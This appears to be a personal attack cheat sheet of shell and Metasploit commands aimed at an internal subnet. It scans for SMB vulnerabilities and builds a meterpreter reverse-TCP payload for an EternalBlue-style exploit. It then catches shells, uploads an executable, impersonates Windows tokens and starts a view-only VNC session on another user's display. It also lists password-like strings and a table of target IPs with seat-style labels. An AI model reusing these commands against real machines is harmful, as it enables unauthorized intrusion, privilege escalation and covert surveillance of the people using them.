```bash
nmap -n -p 445 --script=vuln 172.17.227.65-200
nmblookup -A <ip>
msfvenom --payload windows/meterpreter/reverse_tcp LPORT=172.17.227.104 LPORT=4444 -o shellcode.bin
cat sc_x86_kernel.bin shellcode.bin > sc_x86.bin
./Win7Blue
```

```msfg
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set rhost 172.17.227.65-220
set lhost 172.17.227.104
run
upload lemonlime.exe
use incognito
list_tokens -u
impersonate_token <token>
shell
```

`pxbakioi%%%orz%%%wtz10.07.19wtzzhy80`

Capture 
```sh
llks -s -m /usr/local/bin/llkk.cnf -o /tmp/xxxxxxxx
su noi -s /bin/sh; x11vnc -viewonly -display :0 -rfbauth ~/.vnc/passwd
```

`Ew2IEOEcEkTD4aBYwukD`

|IP|Port|
|:-:|:-:|
172.17.227.69|TEC1
172.17.227.70|A01
172.17.227.80|B02
172.17.227.83|B05
172.17.227.87|C01
172.17.227.88|C02
172.17.227.92|C06
172.17.227.95|D01